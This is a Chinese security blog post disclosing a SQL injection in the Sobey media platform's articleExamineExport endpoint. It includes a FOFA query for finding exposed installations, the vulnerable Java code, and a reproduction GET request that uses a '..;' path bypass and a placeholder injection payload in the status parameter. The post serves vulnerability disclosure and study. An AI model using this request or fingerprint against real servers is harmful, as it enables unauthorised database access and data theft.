---
title: "索贝融媒体 /sobey-mchEditor/mch/Articlelist/articleExamineExport SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-Articlelist-articleExamineExport-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormcharticlelistarticleexamineexport-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/Articlelist/articleExamineExport SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/21 08:23
* 670浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

sql

软件

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/Articlelist/articleExamineExport 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入防护

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

深入探索

SQL

安全

计算机安全

根据漏洞信息看下`mch/Articlelist/articleExamineExport`的实现逻辑

```
@RequestMapping(
    value = {"/articleExamineExport"},
    method = {RequestMethod.GET}
)
public Response articleScorelistExport(HttpServletResponse response, HttpServletRequest request, @RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam(value = "catalogids",required = false) String catalogids, @RequestParam(value = "status",required = false) String status, @RequestParam(value = "createStartTime",required = false) String createStartTime, @RequestParam(value = "endStartTime",required = false) String endStartTime) {
    if (!StringUtils.isEmpty(createStartTime) && !StringUtils.isEmpty(endStartTime)) {
        QueryBuilder qb = new QueryBuilder("select id,title,createUserName,publishDate,author from zcnarticle where 1=1 and status!=0");
        if (StringUtil.isNotEmpty(createStartTime)) {
            createStartTime = createStartTime + " 00:00:00";
            qb.append(" and createDate >= str_to_date(? ,'%Y-%m-%d %H:%i:%s')", createStartTime);
        }

        if (StringUtil.isNotEmpty(endStartTime)) {
            endStartTime = endStartTime + " 23:59:59";
            qb.append(" and createDate <= str_to_date(? ,'%Y-%m-%d %H:%i:%s')", endStartTime);
        }

        if (StringUtil.isNotEmpty(status)) {
            qb.append(" and status in(" + status + ")");
        }

        if (StringUtil.isNotEmpty(catalogids)) {
            qb.append(" and catalogID in(" + catalogids + ")");
        }
```

深入探索

安全研究报告

编程语言教程

编码转换工具

参数**status**和**catalogids**无任何过滤或校验处理，被直接拼接到qb这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /sobey-mchEditor/js/..;/mch/Articlelist/articleExamineExport?siteCode=1&status=)SQLI_POC&token=1&createStartTime=&endStartTime= HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/mch/Articlelist/articleExamineExport SQL注入漏洞](images/img-001-99f9e97272fa.webp)](https://image.mrxn.net/12d1d301922d4666b0a2c70c3ba33b01.webp)

通过报错注入获取到数据库用户信息

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/Articlelist/articleExamineExport SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-articleExamineExport-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-Articlelist-articleExamineExport-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-Articlelist-articleExamineExport-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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